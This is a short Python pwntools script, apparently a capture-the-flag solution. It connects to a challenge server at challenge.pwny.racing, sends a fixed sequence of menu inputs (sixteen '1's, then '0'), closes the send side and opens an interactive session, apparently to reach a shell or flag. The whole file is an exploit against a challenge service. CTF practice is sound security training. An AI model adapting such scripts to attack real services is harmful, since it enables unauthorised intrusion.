from pwn import *
import tty


p = remote("challenge.pwny.racing", 40011)

for i in range(16):
  p.sendlineafter("<<", "1")

p.sendlineafter("<<", "0")

p.shutdown("send")


p.interactive()
